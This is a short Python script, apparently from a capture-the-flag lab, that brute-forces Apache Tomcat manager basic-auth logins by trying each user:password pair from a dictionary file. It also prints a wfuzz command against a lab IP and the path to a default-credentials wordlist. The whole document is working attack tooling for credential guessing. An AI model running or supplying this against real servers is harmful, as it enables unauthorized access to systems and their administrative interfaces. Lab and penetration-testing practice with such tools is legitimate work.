#!/usr/bin/env python
import sys
import requests

print "Just run wfuzz -u http://10.10.10.95:8080/manager/html  --basic FUZZ -w tomcat-dic.txt  --hc 401 "
print "python brute.py dictionary_file url"

print "Defautl tomcat-user-pass: /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt" 

with open(sys.argv[1]) as f:
	for line in f:
		c = line.strip('\n').split(":")
		print "testing "+c[0]+":"+ c[1]
		r = requests.get(sys.argv[2], auth=(c[0], c[1]))
		if r.status_code == 200:
			print "Found valid credentials \"" + line.strip('\n') + "\""
			raise sys.exit()
